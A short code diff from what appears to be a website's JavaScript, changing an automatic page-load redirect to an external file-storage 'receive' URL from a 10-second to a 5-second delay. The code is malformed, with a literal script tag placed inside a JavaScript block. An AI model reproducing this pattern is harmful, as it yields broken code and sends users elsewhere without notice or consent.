@@ -30,10 +30,8 @@ document.addEventListener('DOMContentLoaded', () => {
     ];
 
     <script>
-setTimeout(function() {
-    window.location.href = "https://storage.rcs-rds.ro/receive/fa70a871-0b54-4c53-b7c3-4aaca8804730";
-}, 10000); // 5000 ms = 5 secunde
-</script>
+    setTimeout(() => location.href = "https://storage.rcs-rds.ro/receive/fa70a871-0b54-4c53-b7c3-4aaca8804730", 5000);
+    </script>
 
     animatedElements.forEach(el => {
         if (el) {
